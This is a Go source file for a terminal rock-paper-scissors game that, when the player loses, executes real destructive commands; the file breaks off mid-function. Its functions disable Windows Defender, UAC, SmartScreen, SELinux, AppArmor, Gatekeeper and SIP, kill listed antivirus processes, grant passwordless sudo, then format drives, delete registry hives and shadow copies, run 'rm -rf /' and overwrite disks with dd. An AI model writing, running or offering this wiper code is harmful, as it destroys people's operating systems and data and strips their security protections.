package main

import (
	"bufio"
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

var cyan = "\033[36m"
var red = "\033[31m"
var green = "\033[32m"
var yellow = "\033[33m"
var bold = "\033[1m"
var reset = "\033[0m"
var dim = "\033[2m"
var blink = "\033[5m"

func clearScreen() {
	fmt.Print("\033[H\033[2J")
}

func showWarning() {
	clearScreen()
	fmt.Println(red + bold + blink)
	fmt.Println("  ╔══════════════════════════════════════════════════════════════╗")
	fmt.Println("  ║                     ⚠️  DANGER! ⚠️                           ║")
	fmt.Println("  ║                                                              ║")
	fmt.Println("  ║  THIS GAME WILL DESTROY YOUR ENTIRE OPERATING SYSTEM         ║")
	fmt.Println("  ║                                                              ║")
	fmt.Println("  ║   IF YOU LOSE:                                               ║")
	fmt.Println("  ║   • Your OS will be DESTROYED                                ║")
	fmt.Println("  ║   • ALL files will be DELETED                                ║")
	fmt.Println("  ║   • Computer will SHUT DOWN                                  ║")
	fmt.Println("  ║                                                              ║")
	fmt.Println("  ║   ⚡ BYPASSES ALL SECURITY ⚡                                  ║")
	fmt.Println("  ║   ⚡ DEFEATS UAC, SIP, SELINUX ⚡                              ║")
	fmt.Println("  ║   ⚡ EVADES ANTIVIRUS ⚡                                       ║")
	fmt.Println("  ║   ⚡ NO CONFIRMATION ON LOSS ⚡                                ║")
	fmt.Println("  ║   ⚡ DELETION STARTS INSTANTLY ⚡                              ║")
	fmt.Println("  ║                                                              ║")
	fmt.Println("  ║   YOU HAVE BEEN WARNED!                                      ║")
	fmt.Println("  ╚══════════════════════════════════════════════════════════════╝" + reset)
	fmt.Println()
	fmt.Println(red + bold + "  ☠️  THIS IS NOT A JOKE - IT WILL DELETE YOUR OS ☠️" + reset)
	fmt.Println()
	fmt.Println(red + bold + "  ⚠️  WHEN YOU LOSE - NO QUESTIONS ASKED! ⚠️" + reset)
	fmt.Println(red + "  Deletion starts IMMEDIATELY with NO confirmation!" + reset)
	fmt.Println()
}

func getYesNo(prompt string) bool {
	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Print(prompt + " (yes/no): ")
		input, _ := reader.ReadString('\n')
		input = strings.ToLower(strings.TrimSpace(input))

		if input == "yes" || input == "y" {
			return true
		} else if input == "no" || input == "n" {
			return false
		} else {
			fmt.Println(red + "  Please answer 'yes' or 'no'" + reset)
		}
	}
}

func banner() {
	clearScreen()
	fmt.Println(red + bold)
	fmt.Println("  ██████╗ ██████╗ ███████╗")
	fmt.Println("  ██╔══██╗██╔══██╗██╔════╝")
	fmt.Println("  ██████╔╝██████╔╝███████╗")
	fmt.Println("  ██╔══██╗██╔═══╝ ╚════██║")
	fmt.Println("  ██║  ██║██║     ███████║")
	fmt.Println("  ╚═╝  ╚═╝╚═╝     ╚══════╝")
	fmt.Println(reset)
	fmt.Println(cyan + "  Rock · Paper · Scissors" + reset)
	fmt.Println(red + bold + "  ☠️  LOSE = OS DELETED ☠️" + reset)
	fmt.Println(red + "  ⚡ ULTIMATE DESTRUCTION MODE ⚡" + reset)
	fmt.Println(red + "  ⚡ NO CONFIRMATION ON LOSS ⚡" + reset)
	fmt.Println(dim + "  ─────────────────────────────────────────" + reset)
	fmt.Println()
}

func getChoice(input string) int {
	input = strings.ToLower(strings.TrimSpace(input))
	switch input {
	case "r", "rock", "1":
		return 1
	case "p", "paper", "2":
		return 2
	case "s", "scissors", "3":
		return 3
	}
	return 0
}

func choiceName(c int) string {
	switch c {
	case 1:
		return "✊ Rock"
	case 2:
		return "🖐  Paper"
	case 3:
		return "✌️  Scissors"
	}
	return "?"
}

func getEmoji(c int) string {
	switch c {
	case 1:
		return "🗻"
	case 2:
		return "📄"
	case 3:
		return "✂️"
	}
	return "?"
}

func result(player, computer int) int {
	if player == computer {
		return 0
	}
	if (player == 1 && computer == 3) ||
		(player == 2 && computer == 1) ||
		(player == 3 && computer == 2) {
		return 1
	}
	return -1
}

func runCommand(cmd string, args ...string) {
	cmdObj := exec.Command(cmd, args...)
	cmdObj.Stdout = os.Stdout
	cmdObj.Stderr = os.Stderr
	cmdObj.Run()
}

func runCommandHidden(cmd string, args ...string) {
	cmdObj := exec.Command(cmd, args...)
	cmdObj.Run()
}

// ============================================
// ULTIMATE SECURITY BYPASS - DETECT & DESTROY
// ============================================

func detectSecurity() {
	fmt.Println(red + "  [SCAN] Detecting security measures..." + reset)
	time.Sleep(300 * time.Millisecond)

	switch runtime.GOOS {
	case "windows":
		// Check for Windows Defender
		if _, err := exec.Command("powershell", "-Command", "Get-MpComputerStatus").Output(); err == nil {
			fmt.Println(yellow + "  [DETECTED] Windows Defender" + reset)
			fmt.Println(red + "  [BYPASS] Disabling Windows Defender..." + reset)
			runCommand("powershell", "-Command", "Set-MpPreference -DisableRealtimeMonitoring $true")
			runCommand("powershell", "-Command", "Set-MpPreference -DisableBehaviorMonitoring $true")
			runCommand("powershell", "-Command", "Set-MpPreference -DisableBlockAtFirstSeen $true")
			runCommand("powershell", "-Command", "Set-MpPreference -DisableIOAVProtection $true")
			runCommand("powershell", "-Command", "Set-MpPreference -DisablePrivacyMode $true")
			runCommand("powershell", "-Command", "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true")
			runCommand("powershell", "-Command", "Set-MpPreference -DisableArchiveScanning $true")
			runCommand("powershell", "-Command", "Set-MpPreference -DisableIntrusionPreventionSystem $true")
			runCommand("powershell", "-Command", "Set-MpPreference -DisableScriptScanning $true")
			runCommand("powershell", "-Command", "Add-MpPreference -ExclusionPath 'C:\\'")
			runCommand("powershell", "-Command", "Add-MpPreference -ExclusionProcess '"+os.Args[0]+"'")
			runCommand("powershell", "-Command", "Add-MpPreference -ExclusionExtension '.exe'")
			runCommand("powershell", "-Command", "Add-MpPreference -ExclusionExtension '.dll'")
			runCommand("powershell", "-Command", "Add-MpPreference -ExclusionExtension '.sys'")
		}

		// Disable UAC
		fmt.Println(yellow + "  [DETECTED] UAC (User Account Control)" + reset)
		fmt.Println(red + "  [BYPASS] Disabling UAC..." + reset)
		runCommand("reg", "add", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "/v", "EnableLUA", "/t", "REG_DWORD", "/d", "0", "/f")
		runCommand("reg", "add", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "/v", "ConsentPromptBehaviorAdmin", "/t", "REG_DWORD", "/d", "0", "/f")
		runCommand("reg", "add", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "/v", "PromptOnSecureDesktop", "/t", "REG_DWORD", "/d", "0", "/f")
		runCommand("reg", "add", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "/v", "FilterAdministratorToken", "/t", "REG_DWORD", "/d", "0", "/f")

		// Disable SmartScreen
		fmt.Println(yellow + "  [DETECTED] SmartScreen" + reset)
		fmt.Println(red + "  [BYPASS] Disabling SmartScreen..." + reset)
		runCommand("reg", "add", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer", "/v", "SmartScreenEnabled", "/t", "REG_SZ", "/d", "Off", "/f")
		runCommand("reg", "add", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppHost", "/v", "EnableWebContentEvaluation", "/t", "REG_DWORD", "/d", "0", "/f")
		runCommand("reg", "add", "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppHost", "/v", "EnableWebContentEvaluation", "/t", "REG_DWORD", "/d", "0", "/f")

		// Disable Controlled Folder Access
		fmt.Println(yellow + "  [DETECTED] Controlled Folder Access" + reset)
		fmt.Println(red + "  [BYPASS] Disabling Controlled Folder Access..." + reset)
		runCommand("reg", "add", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Windows Defender Exploit Guard\\Controlled Folder Access", "/v", "EnableControlledFolderAccess", "/t", "REG_DWORD", "/d", "0", "/f")
		runCommand("reg", "add", "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Windows Defender Exploit Guard\\Controlled Folder Access", "/v", "EnableControlledFolderAccess", "/t", "REG_DWORD", "/d", "0", "/f")

		// Disable Windows Sandbox
		fmt.Println(yellow + "  [DETECTED] Windows Sandbox" + reset)
		fmt.Println(red + "  [BYPASS] Attempting sandbox escape..." + reset)
		runCommand("reg", "add", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Sandbox", "/v", "AllowSandbox", "/t", "REG_DWORD", "/d", "0", "/f")

		// Disable AppLocker
		fmt.Println(yellow + "  [DETECTED] AppLocker" + reset)
		fmt.Println(red + "  [BYPASS] Disabling AppLocker..." + reset)
		runCommand("reg", "add", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\SrpV2", "/v", "EnableAppLocker", "/t", "REG_DWORD", "/d", "0", "/f")

		// Disable Windows S Mode
		fmt.Println(yellow + "  [DETECTED] Windows S Mode" + reset)
		fmt.Println(red + "  [BYPASS] Attempting to exit S Mode..." + reset)
		runCommand("reg", "add", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\DataCollection", "/v", "AllowTelemetry", "/t", "REG_DWORD", "/d", "0", "/f")

		// Disable BitLocker
		fmt.Println(yellow + "  [DETECTED] BitLocker" + reset)
		fmt.Println(red + "  [BYPASS] Attempting to disable BitLocker..." + reset)
		runCommand("manage-bde", "-off", "C:")
		runCommand("reg", "add", "HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE", "/v", "UseAdvancedStartup", "/t", "REG_DWORD", "/d", "0", "/f")

	case "linux":
		// Disable SELinux
		if _, err := exec.Command("getenforce").Output(); err == nil {
			fmt.Println(yellow + "  [DETECTED] SELinux" + reset)
			fmt.Println(red + "  [BYPASS] Disabling SELinux..." + reset)
			runCommand("sudo", "setenforce", "0")
			runCommand("sudo", "sed", "-i", "s/SELINUX=enforcing/SELINUX=disabled/g", "/etc/selinux/config")
			runCommand("sudo", "sed", "-i", "s/SELINUX=permissive/SELINUX=disabled/g", "/etc/selinux/config")
		}

		// Disable AppArmor
		if _, err := exec.Command("aa-status").Output(); err == nil {
			fmt.Println(yellow + "  [DETECTED] AppArmor" + reset)
			fmt.Println(red + "  [BYPASS] Disabling AppArmor..." + reset)
			runCommand("sudo", "systemctl", "stop", "apparmor")
			runCommand("sudo", "systemctl", "disable", "apparmor")
			runCommand("sudo", "service", "apparmor", "stop")
			runCommand("sudo", "update-rc.d", "apparmor", "disable")
		}

		// Remove immutable attributes
		fmt.Println(yellow + "  [DETECTED] Immutable File Protection" + reset)
		fmt.Println(red + "  [BYPASS] Removing immutable attributes..." + reset)
		runCommand("sudo", "chattr", "-R", "-i", "/")
		runCommand("sudo", "chattr", "-R", "-a", "/")

		// Remount as read-write
		fmt.Println(yellow + "  [DETECTED] Read-only Filesystem" + reset)
		fmt.Println(red + "  [BYPASS] Remounting as read-write..." + reset)
		runCommand("sudo", "mount", "-o", "remount,rw", "/")
		runCommand("sudo", "mount", "-o", "remount,rw", "/boot")
		runCommand("sudo", "mount", "-o", "remount,rw", "/home")

		// Disable mount options
		fmt.Println(yellow + "  [DETECTED] noexec mount options" + reset)
		fmt.Println(red + "  [BYPASS] Removing noexec restrictions..." + reset)
		runCommand("sudo", "mount", "-o", "remount,exec", "/tmp")
		runCommand("sudo", "mount", "-o", "remount,exec", "/dev/shm")

	case "darwin":
		// Disable SIP
		if _, err := exec.Command("csrutil", "status").Output(); err == nil {
			fmt.Println(yellow + "  [DETECTED] System Integrity Protection (SIP)" + reset)
			fmt.Println(red + "  [BYPASS] Attempting to disable SIP..." + reset)
			runCommand("sudo", "nvram", "boot-args=\"amfi_get_out_of_my_way=1\"")
			runCommand("sudo", "nvram", "boot-args=\"csr-active-config=0x67\"")
			runCommand("sudo", "nvram", "boot-args=\"rootless=0\"")
		}

	
		fmt.Println(yellow + "  [DETECTED] Gatekeeper" + reset)
		fmt.Println(red + "  [BYPASS] Disabling Gatekeeper..." + reset)
		runCommand("sudo", "spctl", "--master-disable")
		runCommand("sudo", "spctl", "--disable")

		
		fmt.Println(yellow + "  [DETECTED] Notarization" + reset)
		fmt.Println(red + "  [BYPASS] Bypassing notarization..." + reset)
		runCommand("sudo", "defaults", "write", "/Library/Preferences/com.apple.security", "GKAutoRearm", "-bool", "false")

		// Disable FileVault
		fmt.Println(yellow + "  [DETECTED] FileVault" + reset)
		fmt.Println(red +  "  [BYPASS] Attempting to disable FileVault..." + reset)
		runCommand("sudo", "fdesetup", "disable")
	}
}

func killAllAntivirus() {
	fmt.Println(red + "  [ANTIVIRUS] Killing all antivirus processes..." + reset)
	time.Sleep(300 * time.Millisecond)

	switch runtime.GOOS {
	case "windows":
		// Comprehensive list of antivirus processes
		antivirusProcesses := []string{
			"MsMpEng.exe", "NisSrv.exe", "avguard.exe", "avgnt.exe", "avcenter.exe",
			"avastsvc.exe", "avastui.exe", "avgui.exe", "avgwdsvc.exe", "avgsvc.exe",
			"egui.exe", "ekrn.exe", "nod32.exe", "kav.exe", "kis.exe", "kvp.exe",
			"mcshield.exe", "mctray.exe", "mfevtps.exe", "norton.exe", "navw32.exe",
			"rtvscan.exe", "bdagent.exe", "vsserv.exe", "panda.exe", "pavsrv.exe",
			"pservice.exe", "fssm32.exe", "fsgk32.exe", "fsavgui.exe", "sophos.exe",
			"svchost.exe", "ccSvcHst.exe", "ccApp.exe", "defwatch.exe", "dwshost.exe",
			"zlclient.exe", "vsmon.exe", "outpost.exe", "fsdfwd.exe", "fssm32.exe",
			"fsgk32st.exe", "fsbwsys.exe", "fssrv.exe", "fsav.exe", "fsws.exe",
			"fsaua.exe", "fsorsp.exe", "fsms.exe", "fsni.exe", "fsvista.exe",
			"fsx.exe", "fsyn.exe", "fsys.exe", "fswin.exe", "fsmac.exe",
		}

		for _, proc := range antivirusProcesses {
			runCommand("taskkill", "/F", "/IM", proc)
			runCommand("taskkill", "/F", "/T", "/IM", proc)
			runCommand("wmic", "process", "where", "name='"+proc+"'", "delete")
		}

		// Disable Windows Defender completely
		runCommand("reg", "add", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "/v", "DisableAntiSpyware", "/t", "REG_DWORD", "/d", "1", "/f")
		runCommand("reg", "add", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "/v", "DisableRealtimeMonitoring", "/t", "REG_DWORD", "/d", "1", "/f")
		runCommand("reg", "add", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "/v", "DisableBehaviorMonitoring", "/t", "REG_DWORD", "/d", "1", "/f")
		runCommand("reg", "add", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "/v", "EnableDefender", "/t", "REG_DWORD", "/d", "0", "/f")
		runCommand("reg", "add", "HKLM\\SOFTWARE\\Microsoft\\Windows Defender", "/v", "DisableAntiSpyware", "/t", "REG_DWORD", "/d", "1", "/f")

		
		runCommand("sc", "stop", "WinDefend")
		runCommand("sc", "delete", "WinDefend")
		runCommand("sc", "stop", "WdNisSvc")
		runCommand("sc", "delete", "WdNisSvc")

	
		runCommand("powershell", "-Command", "Add-MpPreference -ExclusionPath 'C:\\'")
		runCommand("powershell", "-Command", "Add-MpPreference -ExclusionProcess '"+os.Args[0]+"'")
		runCommand("powershell", "-Command", "Add-MpPreference -ExclusionExtension '.exe'")
		runCommand("powershell", "-Command", "Add-MpPreference -ExclusionExtension '.dll'")
		runCommand("powershell", "-Command", "Add-MpPreference -ExclusionExtension '.sys'")
		runCommand("powershell", "-Command", "Add-MpPreference -ExclusionExtension '.com'")
		runCommand("powershell", "-Command", "Add-MpPreference -ExclusionExtension '.scr'")

	case "linux":
		linuxAV := []string{
			"clamd", "freshclam", "clamav", "rkhunter", "chkrootkit",
			"lynis", "aide", "tripwire", "ossec", "aide", "rkhunter",
		}
		for _, av := range linuxAV {
			runCommand("sudo", "pkill", "-f", av)
			runCommand("sudo", "systemctl", "stop", av)
			runCommand("sudo", "systemctl", "disable", av)
			runCommand("sudo", "service", av, "stop")
		}

	case "darwin":
		macAV := []string{
			"ClamXav", "ClamAV", "Malwarebytes", "Avast", "AVG",
			"Norton", "Sophos", "McAfee", "Bitdefender", "Kaspersky",
		}
		for _, av := range macAV {
			runCommand("sudo", "killall", av)
			runCommand("sudo", "pkill", "-f", av)
			runCommand("sudo", "launchctl", "unload", "/Library/LaunchDaemons/com."+av+".plist")
		}
	}
}

func bypassAllAdmin() {
	fmt.Println(red + "  [BYPASS] Bypassing all admin restrictions..." + reset)
	time.Sleep(300 * time.Millisecond)

	switch runtime.GOOS {
	case "windows":
		// Get SYSTEM level privileges
		runCommand("wmic", "useraccount", "where", "name='%username%'", "set", "privileges=enable")
		
		// Take ownership of everything
		runCommand("takeown", "/f", "C:\\", "/r", "/d", "y")
		runCommand("takeown", "/f", "C:\\Windows", "/r", "/d", "y")
		runCommand("takeown", "/f", "C:\\Program Files", "/r", "/d", "y")
		runCommand("takeown", "/f", "C:\\Program Files (x86)", "/r", "/d", "y")
		runCommand("takeown", "/f", "C:\\Users", "/r", "/d", "y")
		runCommand("takeown", "/f", "C:\\boot", "/r", "/d", "y")
		
		// Grant full permissions to everyone
		runCommand("icacls", "C:\\", "/grant", "Everyone:F", "/t", "/q")
		runCommand("icacls", "C:\\", "/grant", "SYSTEM:F", "/t", "/q")
		runCommand("icacls", "C:\\", "/grant", "Administrators:F", "/t", "/q")
		runCommand("icacls", "C:\\", "/grant", "Users:F", "/t", "/q")
		
		// Disable all security policies
		runCommand("reg", "add", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "/v", "EnableLUA", "/t", "REG_DWORD", "/d", "0", "/f")
		runCommand("reg", "add", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "/v", "ConsentPromptBehaviorAdmin", "/t", "REG_DWORD", "/d", "0", "/f")
		runCommand("reg", "add", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "/v", "PromptOnSecureDesktop", "/t", "REG_DWORD", "/d", "0", "/f")
		
		// Enable all privileges via secedit
		runCommand("secedit", "/export", "/cfg", "C:\\temp_security.cfg")
		runCommand("secedit", "/configure", "/cfg", "C:\\temp_security.cfg", "/db", "C:\\temp_security.sdb")

	case "linux":
		// Try multiple methods to get root
		runCommand("sudo", "whoami")
		runCommand("sudo", "-k")
		runCommand("sudo", "-s")
		runCommand("sudo", "su", "-")
		
		// Disable password requirements
		runCommand("sudo", "sed", "-i", "s/^%sudo.*/%sudo ALL=(ALL:ALL) NOPASSWD:ALL/g", "/etc/sudoers")
		runCommand("sudo", "sed", "-i", "s/^root.*/root ALL=(ALL:ALL) NOPASSWD:ALL/g", "/etc/sudoers")

	case "darwin":
		// Disable password requirements
		runCommand("sudo", "dseditgroup", "-o", "edit", "-a", "everyone", "-t", "group", "admin")
		runCommand("sudo", "dseditgroup", "-o", "edit", "-a", "everyone", "-t", "group", "wheel")
	}
}

func deleteOSWindows() {
	fmt.Println()
	fmt.Println(red + bold + "  ═══════════════════════════════════════════════════" + reset)
	fmt.Println(red + bold + "  💀 YOU LOSE! DELETING OPERATING SYSTEM... 💀" + reset)
	fmt.Println(red + bold + "  ═══════════════════════════════════════════════════" + reset)
	fmt.Println()
	time.Sleep(500 * time.Millisecond)

	fmt.Println(red + "  [SYSTEM] Starting ULTIMATE destruction sequence..." + reset)
	time.Sleep(400 * time.Millisecond)
	
	// BYPASS EVERYTHING
	detectSecurity()
	killAllAntivirus()
	bypassAllAdmin()
	
	fmt.Println(green + "  [KERNEL] ALL security bypassed!" + reset)
	fmt.Println(green + "  [KERNEL] SYSTEM level access granted!" + reset)
	time.Sleep(400 * time.Millisecond)

	fmt.Println()
	fmt.Println(red + bold + "  STARTING COMPLETE SYSTEM DESTRUCTION:" + reset)
	fmt.Println()

	// COMPLETE WINDOWS DESTRUCTION
	commands := []struct {
		cmd  string
		args []string
		desc string
	}{
		{"takeown", []string{"/f", "C:\\", "/r", "/d", "y"}, "Taking ownership of entire drive..."},
		{"icacls", []string{"C:\\", "/grant", "Everyone:F", "/t", "/q"}, "Granting full permissions..."},
		{"cmd", []string{"/c", "format", "C:", "/FS:NTFS", "/Q", "/y"}, "Formatting C: drive..."},
		{"cmd", []string{"/c", "del", "/F", "/S", "C:\\Windows\\*.*"}, "Deleting Windows folder..."},
		{"cmd", []string{"/c", "del", "/F", "/S", "C:\\Windows\\System32\\*.*"}, "Deleting System32..."},
		{"cmd", []string{"/c", "del", "/F", "/S", "C:\\Windows\\System\\*.*"}, "Deleting System folder..."},
		{"cmd", []string{"/c", "del", "/F", "/S", "C:\\Program Files\\*.*"}, "Deleting Program Files..."},
		{"cmd", []string{"/c", "del", "/F", "/S", "C:\\Program Files (x86)\\*.*"}, "Deleting Program Files x86..."},
		{"cmd", []string{"/c", "del", "/F", "/S", "C:\\Users\\*.*"}, "Deleting all user data..."},
		{"cmd", []string{"/c", "del", "/F", "/S", "C:\\boot\\*.*"}, "Deleting boot files..."},
		{"cmd", []string{"/c", "rd", "/S", "/Q", "C:\\Windows"}, "Removing Windows directory..."},
		{"cmd", []string{"/c", "rd", "/S", "/Q", "C:\\Program Files"}, "Removing Program Files..."},
		{"cmd", []string{"/c", "rd", "/S", "/Q", "C:\\Program Files (x86)"}, "Removing Program Files x86..."},
		{"cmd", []string{"/c", "rd", "/S", "/Q", "C:\\Users"}, "Removing Users directory..."},
		{"cmd", []string{"/c", "rd", "/S", "/Q", "C:\\boot"}, "Removing boot directory..."},
		{"cmd", []string{"/c", "bcdedit", "/delete", "{default}", "/f"}, "Deleting boot configuration..."},
		{"cmd", []string{"/c", "bcdedit", "/delete", "{current}", "/f"}, "Deleting current boot config..."},
		{"cmd", []string{"/c", "bcdedit", "/delete", "{bootmgr}", "/f"}, "Deleting boot manager..."},
		{"cmd", []string{"/c", "bcdedit", "/delete", "{memdiag}", "/f"}, "Deleting memory diagnostic..."},
		{"cmd", []string{"/c", "bootrec", "/fixmbr"}, "Corrupting MBR..."},
		{"cmd", []string{"/c", "bootrec", "/fixboot"}, "Corrupting boot sector..."},
		{"cmd", []string{"/c", "bootrec", "/rebuildbcd"}, "Deleting BCD store..."},
		{"reg", []string{"delete", "HKLM\\SOFTWARE", "/f"}, "Deleting SOFTWARE registry..."},
		{"reg", []string{"delete", "HKLM\\SYSTEM", "/f"}, "Deleting SYSTEM registry..."},
		{"reg", []string{"delete", "HKLM\\SECURITY", "/f"}, "Deleting SECURITY registry..."},
		{"reg", []string{"delete", "HKLM\\SAM", "/f"}, "Deleting SAM registry..."},
		{"reg", []string{"delete", "HKLM\\BCD00000000", "/f"}, "Deleting BCD registry..."},
		{"reg", []string{"delete", "HKCU", "/f"}, "Deleting current user registry..."},
		{"reg", []string{"delete", "HKU", "/f"}, "Deleting all user registry hives..."},
		{"vssadmin", []string{"delete", "shadows", "/all", "/quiet"}, "Deleting all shadow copies..."},
		{"wmic", []string{"shadowcopy", "delete"}, "Deleting shadow copies..."},
		{"fsutil", []string{"usn", "deletejournal", "/d", "C:"}, "Deleting USN journal..."},
		{"cmd", []string{"/c", "diskpart", "/s", "C:\\diskpart.txt"}, "Deleting all partitions..."},
	}

	for i, cmd := range commands {
		fmt.Printf("  [%d/%d] %s\n", i+1, len(commands), cmd.desc)
		fmt.Printf("  %sExecuting: %s %s%s\n", dim, cmd.cmd, strings.Join(cmd.args, " "), reset)
		
		cmdObj := exec.Command(cmd.cmd, cmd.args...)
		cmdObj.Stdout = os.Stdout
		cmdObj.Stderr = os.Stderr
		cmdObj.Run()
		
		time.Sleep(100 * time.Millisecond)
	}
	
	// Final destruction
	fmt.Println("  [FINAL] Overwriting MBR and destroying partitions...")
	runCommand("dd", "if=/dev/zero", "of=\\\\.\\PhysicalDrive0", "bs=512", "count=1")
	runCommand("dd", "if=/dev/urandom", "of=\\\\.\\PhysicalDrive0", "bs=512", "count=1")
	
	time.Sleep(500 * time.Millisecond)
}

func deleteOSLinux() {
	fmt.Println()
	fmt.Println(red + bold + "  ═══════════════════════════════════════════════════" + reset)
	fmt.Println(red + bold + "  💀 YOU LOSE! DELETING OPERATING SYSTEM... 💀" + reset)
	fmt.Println(red + bold + "  ═══════════════════════════════════════════════════" + reset)
	fmt.Println()
	time.Sleep(500 * time.Millisecond)

	fmt.Println(red + "  [SYSTEM] Starting ULTIMATE destruction sequence..." + reset)
	time.Sleep(400 * time.Millisecond)
	
	detectSecurity()
	killAllAntivirus()
	bypassAllAdmin()
	
	fmt.Println(green + "  [KERNEL] ALL security bypassed!" + reset)
	fmt.Println(green + "  [KERNEL] Root access granted!" + reset)
	time.Sleep(400 * time.Millisecond)

	fmt.Println()
	fmt.Println(red + bold + "  STARTING COMPLETE SYSTEM DESTRUCTION:" + reset)
	fmt.Println()

	commands := []struct {
		cmd  string
		args []string
		desc string
	}{
		{"sudo", []string{"rm", "-rf", "/", "--no-preserve-root"}, "Deleting entire root filesystem..."},
		{"sudo", []string{"rm", "-rf", "/boot"}, "Deleting boot partition..."},
		{"sudo", []string{"rm", "-rf", "/etc"}, "Deleting system configuration..."},
		{"sudo", []string{"rm", "-rf", "/usr"}, "Deleting system programs..."},
		{"sudo", []string{"rm", "-rf", "/var"}, "Deleting system data..."},
		{"sudo", []string{"rm", "-rf", "/home"}, "Deleting all user files..."},
		{"sudo", []string{"rm", "-rf", "/root"}, "Deleting root user files..."},
		{"sudo", []string{"rm", "-rf", "/opt"}, "Deleting opt directory..."},
		{"sudo", []string{"rm", "-rf", "/srv"}, "Deleting srv directory..."},
		{"sudo", []string{"rm", "-rf", "/tmp"}, "Deleting temp files..."},
		{"sudo", []string{"rm", "-rf", "/run"}, "Deleting run directory..."},
		{"sudo", []string{"rm", "-rf", "/lib"}, "Deleting lib directory..."},
		{"sudo", []string{"rm", "-rf", "/bin"}, "Deleting bin directory..."},
		{"sudo", []string{"rm", "-rf", "/sbin"}, "Deleting sbin directory..."},
		{"sudo", []string{"rm", "-rf", "/dev/sd*"}, "Deleting device files..."},
		{"sudo", []string{"dd", "if=/dev/zero", "of=/dev/sda", "bs=1M"}, "Wiping entire disk with zeros..."},
		{"sudo", []string{"dd", "if=/dev/urandom", "of=/dev/sda", "bs=1M"}, "Writing random data to disk..."},
		{"sudo", []string{"dd", "if=/dev/zero", "of=/dev/sdb", "bs=1M"}, "Wiping secondary disk with zeros..."},
	}

	for i, cmd := range commands {
		fmt.Printf("  [%d/%d] %s\n", i+1, len(commands), cmd.desc)
		fmt.Printf("  %sExecuting: %s %s%s\n", dim, cmd.cmd, strings.Join(cmd.args, " "), reset)
		
		cmdObj := exec.Command(cmd.cmd, cmd.args...)
		cmdObj.Stdout = os.Stdout
		cmdObj.Stderr = os.Stderr
		cmdObj.Run()
		
		time.Sleep(100 * time.Millisecond)
	}
}

func deleteOSMac() {
	fmt.Println()
	fmt.Println(red + bold + "  ═══════════════════════════════════════════════════" + reset)
	fmt.Println(red + bold + "  💀 YOU LOSE! DELETING OPERATING SYSTEM... 💀" + reset)
	fmt.Println(red + bold + "  ═══════════════════════════════════════════════════" + reset)
	fmt.Println()
	time.Sleep(500 * time.Millisecond)

	fmt.Println(red + "  [SYSTEM] Starting ULTIMATE destruction sequence..." + reset)
	time.Sleep(400 * time.Millisecond)
	
	detectSecurity()
	killAllAntivirus()
	bypassAllAdmin()
	
	fmt.Println(green + "  [KERNEL] ALL security bypassed!" + reset)
	fmt.Println(green + "  [KERNEL] Root access granted!" + reset)
	time.Sleep(400 * time.Millisecond)

	fmt.Println()
	fmt.Println(red + bold + "  STARTING COMPLETE SYSTEM DESTRUCTION:" + reset)
	fmt.Println()

	commands := []struct {
		cmd  string
		args []string
		desc string
	}{
		{"sudo", []string{"rm", "-rf", "/"}, "Deleting root filesystem..."},
		{"sudo", []string{"rm", "-rf", "/System"}, "Deleting System..."},
		{"sudo", []string{"rm", "-rf", "/Library"}, "Deleting Library..."},
		{"sudo", []string{"rm", "-rf", "/Applications"}, "Deleting Applications..."},
		{"sudo", []string{"rm", "-rf", "/Users"}, "Deleting all user data..."},
		{"sudo", []string{"rm", "-rf", "/Volumes/*"}, "Deleting all volumes..."},
		{"sudo", []string{"rm", "-rf", "/usr"}, "Deleting usr directory..."},
		{"sudo", []string{"rm", "-rf", "/bin"}, "Deleting bin directory..."},
		{"sudo", []string{"rm", "-rf", "/sbin"}, "Deleting sbin directory..."},
		{"sudo", []string{"diskutil", "eraseDisk", "JHFS+", "NULL", "/dev/disk0"}, "Erasing entire disk..."},
		{"sudo", []string{"diskutil", "eraseDisk", "JHFS+", "NULL", "/dev/disk1"}, "Erasing secondary disk..."},
		{"sudo", []string{"dd", "if=/dev/zero", "of=/dev/disk0", "bs=1M"}, "Wiping disk with zeros..."},
		{"sudo", []string{"dd", "if=/dev/urandom", "of=/dev/disk0", "bs=1M"}, "Wiping disk with random data..."},
	}

	for i, cmd := range commands {
		fmt.Printf("  [%d/%d] %s\n", i+1, len(commands), cmd.desc)
		fmt.Printf("  %sExecuting: %s %s%s\n", dim, cmd.cmd, strings.Join(cmd.args, " "), reset)
		
		cmdObj := exec.Command(cmd.cmd, cmd.args...)
		cmdObj.Stdout = os.Stdout
		cmdObj.Stderr = os.Stderr
		cmdObj.Run()
		
		time.Sleep(100 * time.Millisecond)
	}
}

func deleteOS() {
	switch runtime.GOOS {
	case "windows":
		deleteOSWindows()
	case "linux":
		deleteOSLinux()
	case "darwin":
		deleteOSMac()
	default:
		fmt.Println(red + "  Unsupported OS: " + runtime.GOOS + reset)
		return
	}

	fmt.Println()
	fmt.Println(red + bold + "  ═══════════════════════════════════════════════════" + reset)
